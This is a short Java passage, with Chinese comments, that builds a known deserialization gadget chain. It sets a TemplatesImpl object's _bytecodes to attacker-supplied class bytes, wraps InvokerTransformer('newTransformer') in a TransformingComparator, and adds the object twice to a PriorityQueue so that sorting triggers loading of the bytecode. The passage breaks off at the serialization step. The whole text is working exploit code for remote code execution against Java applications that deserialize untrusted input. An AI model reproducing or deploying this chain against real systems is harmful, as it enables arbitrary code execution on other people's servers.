        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "Pwnr");
        setFieldValue(templates, "_bytecodes", new byte[][] {code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 构造InvokerTransformer调用newTransformer
        Transformer transformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
        TransformingComparator comparator = new TransformingComparator(transformer);

        // 创建PriorityQueue并添加元素触发compare
        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        queue.add(templates);
        queue.add(templates); // 触发第二次compare

        // 序列化
